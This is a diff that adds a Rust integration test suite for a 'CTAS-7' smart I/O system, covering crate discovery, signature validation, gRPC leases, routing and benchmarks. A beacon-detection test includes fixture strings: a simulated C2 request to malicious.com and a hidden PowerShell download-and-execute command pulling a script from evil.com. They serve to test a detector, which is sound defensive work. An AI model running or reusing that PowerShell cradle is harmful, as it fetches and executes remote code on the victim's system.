@@ -1,0 +1,495 @@
+//! CTAS-7 Smart Deterministic I/O Integration Tests
+//!
+//! Comprehensive test suite for the SDIO system including:
+//! - XSD Discovery Engine tests
+//! - gRPC Health Check system tests
+//! - Neural Mux integration tests
+//! - Security validation tests
+//! - Performance benchmarks
+
+use ctas7_foundation_core::multi_model_neural_mux::*;
+use tokio::time::{timeout, Duration};
+use std::collections::HashMap;
+use uuid::Uuid;
+
+// Test fixtures and mock data
+const TEST_XSD_P1_SIGNATURE: &str = "CERTIFIED_FOUNDATION_CRATE_🔒_XSD_P1_🛡️";
+const TEST_XSD_P2_SIGNATURE: &str = "CERTIFIED_FOUNDATION_CRATE_🔒_XSD_P2_🛡️";
+const TEST_XSD_P3_SIGNATURE: &str = "CERTIFIED_FOUNDATION_CRATE_🔒_XSD_P3_🛡️";
+
+#[tokio::test]
+async fn test_xsd_discovery_engine_basic_functionality() {
+    println!("🧪 Testing XSD Discovery Engine Basic Functionality");
+
+    let mut discovery_engine = XSDDiscoveryEngine::new();
+
+    // Add mock foundation crates with different XSD features
+    let foundation_crates = vec![
+        create_mock_foundation_crate("ctas7-foundation-core", XSDFeature::P1),
+        create_mock_foundation_crate("ctas7-foundation-tactical", XSDFeature::P2),
+        create_mock_foundation_crate("ctas7-foundation-quantum", XSDFeature::P3),
+    ];
+
+    for crate_info in foundation_crates {
+        discovery_engine.register_foundation_crate(crate_info).unwrap();
+    }
+
+    // Test discovery of P1 features
+    let p1_crates = discovery_engine.discover_by_feature(XSDFeature::P1).await.unwrap();
+    assert_eq!(p1_crates.len(), 3, "Should find all crates with P1 compatibility");
+
+    // Test discovery of P3 features (should only find quantum crate)
+    let p3_crates = discovery_engine.discover_by_feature(XSDFeature::P3).await.unwrap();
+    assert_eq!(p3_crates.len(), 1, "Should find only quantum crate with P3");
+    assert_eq!(p3_crates[0].name, "ctas7-foundation-quantum");
+
+    println!("✅ XSD Discovery Engine basic functionality passed");
+}
+
+#[tokio::test]
+async fn test_unicode_anti_counterfeiting_validation() {
+    println!("🧪 Testing Unicode Anti-Counterfeiting Validation");
+
+    let mut auth_engine = AntiCounterfeitingEngine::new();
+
+    // Test valid signatures
+    let valid_cases = vec![
+        (TEST_XSD_P1_SIGNATURE, XSDFeature::P1),
+        (TEST_XSD_P2_SIGNATURE, XSDFeature::P2),
+        (TEST_XSD_P3_SIGNATURE, XSDFeature::P3),
+    ];
+
+    for (signature, feature) in valid_cases {
+        let result = auth_engine.validate_unicode_signature(
+            "test-crate",
+            signature,
+            &[feature]
+        ).unwrap();
+
+        assert!(result.is_valid, "Valid signature should pass validation");
+        assert_eq!(result.trust_level, TrustLevel::Certified);
+    }
+
+    // Test invalid signatures
+    let invalid_signature = "FAKE_FOUNDATION_CRATE_❌";
+    let result = auth_engine.validate_unicode_signature(
+        "fake-crate",
+        invalid_signature,
+        &[XSDFeature::P1]
+    );
+
+    assert!(result.is_err(), "Invalid signature should fail validation");
+
+    // Test signature tampering
+    let tampered_signature = "CERTIFIED_FOUNDATION_CRATE_🔒_XSD_P1_💀"; // Changed shield to skull
+    let result = auth_engine.validate_unicode_signature(
+        "tampered-crate",
+        tampered_signature,
+        &[XSDFeature::P1]
+    );
+
+    assert!(result.is_err(), "Tampered signature should fail validation");
+
+    println!("✅ Unicode Anti-Counterfeiting validation passed");
+}
+
+#[tokio::test]
+async fn test_grpc_health_check_system() {
+    println!("🧪 Testing gRPC Health Check System");
+
+    // Start mock gRPC server
+    let server_addr = "127.0.0.1:50051";
+    let _server_handle = start_mock_grpc_server(server_addr).await;
+
+    // Give server time to start
+    tokio::time::sleep(Duration::from_millis(100)).await;
+
+    let mut health_client = SDIOHealthClient::connect(server_addr).await.unwrap();
+
+    // Test lease establishment
+    let lease_request = LeaseRequest {
+        crate_name: "test-smart-crate".to_string(),
+        xsd_features: vec![XSDFeature::P1 as i32],
+        unicode_signature: TEST_XSD_P1_SIGNATURE.to_string(),
+        requested_lease_duration: 3600, // 1 hour
+    };
+
+    let lease_response = timeout(
+        Duration::from_secs(5),
+        health_client.establish_lease(lease_request)
+    ).await.unwrap().unwrap();
+
+    assert!(lease_response.lease_granted, "Lease should be granted for valid request");
+    assert!(!lease_response.lease_id.is_empty(), "Lease ID should not be empty");
+
+    // Test health checks
+    let health_request = HealthRequest {
+        lease_id: lease_response.lease_id.clone(),
+        system_status: SystemStatus::Healthy as i32,
+    };
+
+    let health_response = timeout(
+        Duration::from_secs(2),
+        health_client.health_check(health_request)
+    ).await.unwrap().unwrap();
+
+    assert_eq!(health_response.status, HealthStatus::Healthy as i32);
+    assert!(health_response.lease_valid, "Lease should remain valid");
+
+    println!("✅ gRPC Health Check System passed");
+}
+
+#[tokio::test]
+async fn test_neural_mux_routing() {
+    println!("🧪 Testing Neural Mux Routing");
+
+    let mut neural_mux = UnifiedNeuralMux::new();
+
+    // Configure test routing rules
+    let routing_rules = vec![
+        create_test_routing_rule("foundation", "tactical", "threat_*", Priority::High),
+        create_test_routing_rule("tactical", "quantum", "encrypt_*", Priority::Critical),
+        create_test_routing_rule("quantum", "foundation", "status_*", Priority::Low),
+    ];
+
+    for rule in routing_rules {
+        neural_mux.add_routing_rule(rule);
+    }
+
+    // Test high-priority threat routing
+    let threat_routes = neural_mux.route_unified_operation(
+        "threat_detected",
+        "foundation",
+        Priority::High
+    ).await.unwrap();
+
+    assert!(!threat_routes.is_empty(), "Should find routes for threat operations");
+    assert_eq!(threat_routes[0].target_processor, "tactical");
+    assert_eq!(threat_routes[0].priority, Priority::High);
+
+    // Test critical encryption routing
+    let encrypt_routes = neural_mux.route_unified_operation(
+        "encrypt_sensitive_data",
+        "tactical",
+        Priority::Normal
+    ).await.unwrap();
+
+    assert!(!encrypt_routes.is_empty(), "Should find routes for encryption operations");
+    assert_eq!(encrypt_routes[0].target_processor, "quantum");
+    assert_eq!(encrypt_routes[0].priority, Priority::Critical); // Should be upgraded
+
+    // Test cross-system synchronization
+    neural_mux.synchronize_systems().await.unwrap();
+
+    println!("✅ Neural Mux Routing passed");
+}
+
+#[tokio::test]
+async fn test_beacon_detection_integration() {
+    println!("🧪 Testing Beacon Detection Integration");
+
+    let beacon_detector = BeaconDetectionBridge::new();
+
+    // Test legitimate SDIO communication
+    let legitimate_payload = create_legitimate_sdio_payload();
+    let validation_result = beacon_detector.validate_sdio_communication(
+        "ctas7-foundation-core",
+        "ctas7-foundation-tactical",
+        &legitimate_payload
+    ).await.unwrap();
+
+    assert!(validation_result.is_safe, "Legitimate communication should be safe");
+    assert_eq!(validation_result.threat_level, ThreatLevel::None);
+
+    // Test suspicious payload (simulated C2 beacon)
+    let suspicious_payload = create_suspicious_payload();
+    let validation_result = beacon_detector.validate_sdio_communication(
+        "unknown-source",
+        "ctas7-foundation-core",
+        &suspicious_payload
+    ).await.unwrap();
+
+    assert!(!validation_result.is_safe, "Suspicious communication should be flagged");
+    assert!(validation_result.threat_level >= ThreatLevel::Medium);
+
+    // Test PowerShell beacon patterns
+    let powershell_beacon = create_powershell_beacon_payload();
+    let validation_result = beacon_detector.validate_sdio_communication(
+        "compromised-system",
+        "ctas7-foundation-core",
+        &powershell_beacon
+    ).await.unwrap();
+
+    assert!(!validation_result.is_safe, "PowerShell beacon should be detected");
+    assert_eq!(validation_result.threat_category, Some("powershell_beacon".to_string()));
+
+    println!("✅ Beacon Detection Integration passed");
+}
+
+#[tokio::test]
+async fn test_database_bridge_integration() {
+    println!("🧪 Testing Database Bridge Integration");
+
+    let db_bridge = DatabaseBridge::new_test_instance().await;
+
+    // Test telemetry storage across multiple databases
+    let telemetry = SDIOTelemetry {
+        timestamp: chrono::Utc::now(),
+        crate_name: "test-crate".to_string(),
+        operation: "discovery".to_string(),
+        latency_ms: 25,
+        success: true,
+        metadata: HashMap::from([
+            ("xsd_feature".to_string(), "p2".to_string()),
+            ("grpc_status".to_string(), "ok".to_string()),
+        ]),
+    };
+
+    let storage_result = db_bridge.store_sdio_telemetry(&telemetry).await.unwrap();
+
+    assert!(storage_result.supabase_stored, "Should store in Supabase");
+    assert!(storage_result.surrealdb_stored, "Should store in SurrealDB");
+    assert!(storage_result.sled_cached, "Should cache in sled");
+
+    // Test data retrieval and consistency
+    let retrieved_telemetry = db_bridge.get_telemetry_by_id(
+        &storage_result.telemetry_id
+    ).await.unwrap();
+
+    assert_eq!(retrieved_telemetry.crate_name, telemetry.crate_name);
+    assert_eq!(retrieved_telemetry.operation, telemetry.operation);
+    assert_eq!(retrieved_telemetry.latency_ms, telemetry.latency_ms);
+
+    // Test graph relationship storage
+    let relationship = CrateRelationship {
+        source_crate: "ctas7-foundation-core".to_string(),
+        target_crate: "test-smart-crate".to_string(),
+        relationship_type: RelationshipType::Foundation,
+        strength: 0.95,
+        established_at: chrono::Utc::now(),
+    };
+
+    db_bridge.store_crate_relationship(&relationship).await.unwrap();
+
+    let relationships = db_bridge.get_crate_relationships("test-smart-crate").await.unwrap();
+    assert!(!relationships.is_empty(), "Should find stored relationships");
+
+    println!("✅ Database Bridge Integration passed");
+}
+
+#[tokio::test]
+async fn test_performance_benchmarks() {
+    println!("🧪 Testing Performance Benchmarks");
+
+    let discovery_engine = XSDDiscoveryEngine::new();
+    let mut benchmark_results = PerformanceBenchmarks::new();
+
+    // Benchmark discovery operations
+    let start_time = std::time::Instant::now();
+    for _ in 0..1000 {
+        let _ = discovery_engine.discover_by_feature(XSDFeature::P1).await;
+    }
+    let discovery_time = start_time.elapsed();
+    benchmark_results.discovery_ops_per_second = 1000.0 / discovery_time.as_secs_f64();
+
+    // Benchmark gRPC health checks
+    let health_client = SDIOHealthClient::connect("127.0.0.1:50051").await.unwrap();
+    let start_time = std::time::Instant::now();
+    for _ in 0..5000 {
+        let health_request = HealthRequest {
+            lease_id: "test-lease".to_string(),
+            system_status: SystemStatus::Healthy as i32,
+        };
+        let _ = health_client.health_check(health_request).await;
+    }
+    let health_check_time = start_time.elapsed();
+    benchmark_results.health_checks_per_second = 5000.0 / health_check_time.as_secs_f64();
+
+    // Benchmark neural mux routing
+    let neural_mux = UnifiedNeuralMux::new();
+    let start_time = std::time::Instant::now();
+    for i in 0..2000 {
+        let operation = format!("test_operation_{}", i);
+        let _ = neural_mux.route_unified_operation(
+            &operation,
+            "foundation",
+            Priority::Normal
+        ).await;
+    }
+    let routing_time = start_time.elapsed();
+    benchmark_results.routing_ops_per_second = 2000.0 / routing_time.as_secs_f64();
+
+    // Verify performance targets
+    assert!(benchmark_results.discovery_ops_per_second >= 20.0,
+           "Discovery should handle 20+ ops/sec (actual: {:.2})",
+           benchmark_results.discovery_ops_per_second);
+
+    assert!(benchmark_results.health_checks_per_second >= 1000.0,
+           "Health checks should handle 1000+ ops/sec (actual: {:.2})",
+           benchmark_results.health_checks_per_second);
+
+    assert!(benchmark_results.routing_ops_per_second >= 100.0,
+           "Routing should handle 100+ ops/sec (actual: {:.2})",
+           benchmark_results.routing_ops_per_second);
+
+    println!("✅ Performance benchmarks passed");
+    println!("📊 Discovery: {:.2} ops/sec", benchmark_results.discovery_ops_per_second);
+    println!("📊 Health Checks: {:.2} ops/sec", benchmark_results.health_checks_per_second);
+    println!("📊 Routing: {:.2} ops/sec", benchmark_results.routing_ops_per_second);
+}
+
+#[tokio::test]
+async fn test_end_to_end_smart_crate_lifecycle() {
+    println!("🧪 Testing End-to-End Smart Crate Lifecycle");
+
+    // Phase 1: Smart crate startup and discovery
+    let mut smart_crate = SmartCrate::new("test-e2e-crate");
+
+    // Discovery should find foundation crates
+    let discovery_result = smart_crate.discover_foundations().await.unwrap();
+    assert!(!discovery_result.foundations.is_empty(), "Should discover foundation crates");
+
+    // Phase 2: Establish gRPC leases
+    let lease_results = smart_crate.establish_grpc_leases().await.unwrap();
+    assert!(lease_results.all_leases_established, "All leases should be established");
+
+    // Phase 3: Register with neural mux
+    let neural_registration = smart_crate.register_with_neural_mux().await.unwrap();
+    assert!(neural_registration.registered, "Should register with neural mux");
+
+    // Phase 4: Validate security
+    let security_validation = smart_crate.validate_security_status().await.unwrap();
+    assert!(security_validation.is_secure, "Security validation should pass");
+
+    // Phase 5: Operational state - simulate some operations
+    for i in 0..10 {
+        let operation = format!("test_operation_{}", i);
+        let result = smart_crate.execute_operation(&operation).await.unwrap();
+        assert!(result.success, "Operation {} should succeed", operation);
+    }
+
+    // Phase 6: Health monitoring
+    let health_status = smart_crate.get_health_status().await.unwrap();
+    assert_eq!(health_status.overall_status, HealthStatus::Healthy);
+    assert!(health_status.grpc_leases_valid, "gRPC leases should remain valid");
+
+    // Phase 7: Graceful shutdown
+    let shutdown_result = smart_crate.graceful_shutdown().await.unwrap();
+    assert!(shutdown_result.clean_shutdown, "Should shutdown cleanly");
+    assert!(shutdown_result.leases_released, "Should release all leases");
+
+    println!("✅ End-to-End Smart Crate Lifecycle passed");
+}
+
+#[tokio::test]
+async fn test_failure_scenarios_and_recovery() {
+    println!("🧪 Testing Failure Scenarios and Recovery");
+
+    let mut sdio_system = SDIOSystem::new_test_instance();
+
+    // Test foundation crate unavailability
+    sdio_system.simulate_foundation_failure("ctas7-foundation-core").await;
+
+    let smart_crate = SmartCrate::new("resilient-test-crate");
+    let discovery_result = smart_crate.discover_foundations().await;
+
+    // Should still work with remaining foundation crates
+    assert!(discovery_result.is_ok(), "Should handle foundation failures gracefully");
+
+    // Test network partition
+    sdio_system.simulate_network_partition().await;
+
+    let health_status = smart_crate.get_health_status().await.unwrap();
+    assert_eq!(health_status.overall_status, HealthStatus::Degraded);
+
+    // Test recovery
+    sdio_system.restore_foundation("ctas7-foundation-core").await;
+    sdio_system.restore_network_connectivity().await;
+
+    tokio::time::sleep(Duration::from_secs(2)).await; // Allow recovery time
+
+    let recovered_status = smart_crate.get_health_status().await.unwrap();
+    assert_eq!(recovered_status.overall_status, HealthStatus::Healthy);
+
+    println!("✅ Failure Scenarios and Recovery passed");
+}
+
+// Helper functions for test fixtures
+
+fn create_mock_foundation_crate(name: &str, xsd_feature: XSDFeature) -> FoundationCrateInfo {
+    FoundationCrateInfo {
+        name: name.to_string(),
+        version: "1.0.0".to_string(),
+        xsd_features: vec![xsd_feature],
+        unicode_signature: match xsd_feature {
+            XSDFeature::P1 => TEST_XSD_P1_SIGNATURE.to_string(),
+            XSDFeature::P2 => TEST_XSD_P2_SIGNATURE.to_string(),
+            XSDFeature::P3 => TEST_XSD_P3_SIGNATURE.to_string(),
+        },
+        grpc_endpoint: format!("127.0.0.1:{}", 50051 + xsd_feature as u16),
+        capabilities: vec!["foundation".to_string(), "sdio".to_string()],
+        last_verified: chrono::Utc::now(),
+    }
+}
+
+fn create_test_routing_rule(
+    source: &str,
+    target: &str,
+    pattern: &str,
+    priority: Priority
+) -> UnifiedRoutingRule {
+    UnifiedRoutingRule {
+        source_system: source.to_string(),
+        target_system: target.to_string(),
+        operation_pattern: pattern.to_string(),
+        priority_mapping: priority,
+        enabled: true,
+    }
+}
+
+fn create_legitimate_sdio_payload() -> Vec<u8> {
+    serde_json::to_vec(&serde_json::json!({
+        "sdio_version": "1.0",
+        "operation": "health_check",
+        "crate_id": "ctas7-foundation-core",
+        "timestamp": chrono::Utc::now().to_rfc3339(),
+        "signature": "valid_signature_hash"
+    })).unwrap()
+}
+
+fn create_suspicious_payload() -> Vec<u8> {
+    // Simulate C2 beacon pattern
+    b"GET /admin/config.aspx HTTP/1.1\r\nHost: malicious.com\r\nUser-Agent: PowerShell\r\n\r\n".to_vec()
+}
+
+fn create_powershell_beacon_payload() -> Vec<u8> {
+    // Simulate PowerShell beacon
+    b"powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://evil.com/shell.ps1')\"".to_vec()
+}
+
+async fn start_mock_grpc_server(addr: &str) -> tokio::task::JoinHandle<()> {
+    let addr: std::net::SocketAddr = addr.parse().unwrap();
+    tokio::spawn(async move {
+        // Mock gRPC server implementation
+        // In real tests, this would be a proper gRPC server
+        let _ = tokio::net::TcpListener::bind(addr).await;
+    })
+}
+
+struct PerformanceBenchmarks {
+    discovery_ops_per_second: f64,
+    health_checks_per_second: f64,
+    routing_ops_per_second: f64,
+}
+
+impl PerformanceBenchmarks {
+    fn new() -> Self {
+        Self {
+            discovery_ops_per_second: 0.0,
+            health_checks_per_second: 0.0,
+            routing_ops_per_second: 0.0,
+        }
+    }
+}
+
+// Additional test utilities and mocks would be implemented here...
